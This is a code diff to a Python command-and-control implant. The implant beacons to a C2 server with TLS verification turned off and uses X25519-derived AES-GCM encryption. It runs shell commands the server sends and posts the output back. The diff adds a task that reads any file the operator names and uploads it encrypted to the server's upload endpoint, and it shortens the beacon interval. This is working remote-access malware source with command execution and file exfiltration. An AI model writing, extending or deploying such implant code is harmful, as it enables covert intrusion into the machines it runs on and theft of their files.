@@ -8,6 +8,8 @@ import subprocess
 import time
 import random
 import json
+import io
+
 import requests
 from cryptography.hazmat.primitives.asymmetric import x25519
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
@@ -18,12 +20,12 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-C2_URL = "https://" + "127.0.0.1:8443"  # Replace with your C2 URL
+C2_URL = "https://" + "127.0.0.1" + ":" + "8443"
 BEACON_URL = C2_URL + "/api/telemetry"
 RESULT_URL = C2_URL + "/api/updates"
 FILE_URL = C2_URL + "/api/upload"
 
-normal_sleep_range = (10, 30)
+normal_sleep_range = (10, 11)
 long_sleep_range = (600, 1200)
 long_sleep = False
 attempts = 0
@@ -31,7 +33,7 @@ attempts = 0
 derived_key = None
 
 
-def encrypt_data(aes_key: bytes, plaintext: str | bytes) -> bytes:
+def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
     """Encrypt data using AES-256-GCM with nonce and encode with base64"""
     if isinstance(plaintext, str):
         plaintext = plaintext.encode()
@@ -139,6 +141,49 @@ while True:
                 except Exception as e:
                     print(f"Error self-destructing: {e}")
                     sys.exit(1)
+            # find and upload file
+            elif task[:4] == "FILE":
+                file_path = task.removeprefix("FILE ")
+                status = None
+                try:
+                    with open(file_path, "rb") as f:
+                        file_bytes = f.read()
+                        enc_filename = encrypt_data(derived_key, file_path)
+                        enc_data = encrypt_data(derived_key, file_bytes)
+                        enc_file = io.BytesIO(enc_data)
+                        file = {"file": (enc_filename, enc_file)}
+                        response = requests.post(
+                            FILE_URL, files=file, timeout=5, verify=False
+                        )
+
+                    status = encrypt_data(
+                        derived_key,
+                        json.dumps({"status": ""}),
+                    )
+                except FileNotFoundError:
+                    status = encrypt_data(
+                        derived_key,
+                        json.dumps({"status": f"Error: file '{file_path}' not found"}),
+                    )
+                except PermissionError:
+                    status = encrypt_data(
+                        derived_key,
+                        json.dumps(
+                            {"status": f"Error: no read permissions for '{file_path}'"}
+                        ),
+                    )
+                except requests.RequestException as e:
+                    status = encrypt_data(
+                        derived_key, json.dumps({"status": f"Request error: {e}"})
+                    )
+                except Exception as e:
+                    status = encrypt_data(
+                        derived_key, json.dumps({"status": f"Unknown error: {e}"})
+                    )
+
+                # post file upload status
+                requests.post(RESULT_URL, data=status, timeout=5, verify=False)
+            # run shell cmd and upload results
             else:
                 try:
                     output = subprocess.check_output(
@@ -147,7 +192,9 @@ while True:
                 except subprocess.CalledProcessError as e:
                     output = e.output
 
-                result_payload = encrypt_data(derived_key, str({"result": output}))
+                result_payload = encrypt_data(
+                    derived_key, json.dumps({"result": output})
+                )
                 requests.post(RESULT_URL, data=result_payload, timeout=5, verify=False)
 
         if long_sleep:
@@ -155,7 +202,7 @@ while True:
         else:
             time.sleep(random.randrange(*normal_sleep_range))
 
-    except Exception as e:
+    except requests.RequestException as e:
         print(f"[!] Error: {e}")
         if long_sleep:
             time.sleep(random.randrange(*long_sleep_range))
